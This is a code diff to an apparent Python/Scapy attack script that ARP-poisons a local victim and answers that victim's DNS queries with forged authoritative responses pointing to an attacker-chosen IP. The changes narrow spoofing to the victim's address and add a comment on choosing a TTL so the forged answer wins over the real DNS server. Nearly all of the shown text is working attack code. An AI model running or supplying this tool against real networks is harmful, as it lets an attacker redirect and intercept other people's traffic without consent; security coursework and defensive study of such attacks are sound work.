@@ -20,7 +20,7 @@ def run(args):
     stop_event = threading.Event()
 
     def dns_spoof_packet(packet):
-        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and packet.getlayer(IP).src == victim_ip:
             # Packet is a DNS request
             dns_req = packet.getlayer(DNS).qd.qname
             
@@ -34,9 +34,10 @@ def run(args):
                     UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
                     DNS(
                         id=packet[DNS].id,
-                        qr=1,  # This is a response
+                        qr=1,  
                         aa=1,
                         qd=packet[DNS].qd,
+                        # Does not work when ttl = 0, since no chaching is done and legit DNS server's response will win
                         an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoof_ip)
                     )
                 )
@@ -50,11 +51,6 @@ def run(args):
         arp_poison_thread.setDaemon(True)
         arp_poison_thread.start()
 
-        #packet = request_dns(domain, interface)     
-        #print("Response {}".format(packet.summary()))
-        #print(packet[DNS].an)
-        #spoofed_packet = spoof_packet(packet, spoof_ip, victim_ip)
-        #print("Spoofed response {}".format(spoofed_packet.summary()))
         sniff(filter="udp port 53", prn=dns_spoof_packet, iface=interface)
         print("Stopping sniffing... (Ctrl+C again to stop the ARP Poisoning too.)")
 
